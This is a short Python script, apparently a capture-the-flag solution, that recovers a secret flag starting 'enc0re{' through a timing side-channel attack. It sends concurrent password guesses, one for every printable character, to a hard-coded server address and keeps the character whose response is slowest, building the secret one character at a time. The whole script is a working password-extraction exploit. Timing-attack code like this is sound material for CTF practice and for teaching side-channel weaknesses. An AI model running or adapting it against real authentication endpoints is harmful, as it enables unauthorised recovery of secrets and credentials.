from __future__ import print_function

from requests_futures.sessions import FuturesSession
import string
import sys

server = "http://139.59.46.128:2345/"

flag = "enc0re{"

if sys.stdout.isatty():
    print(flag, end="\r")
    sys.stdout.flush()

with FuturesSession(max_workers=len(string.printable)) as session:
    while not flag.endswith("}"):
        futures = [session.post(server, data={"password": flag + char}) for char in string.printable]

        flag += max(zip((future.result().elapsed for future in futures), string.printable))[1]

        if sys.stdout.isatty():
            print(flag, end="\r")
            sys.stdout.flush()

print(flag)
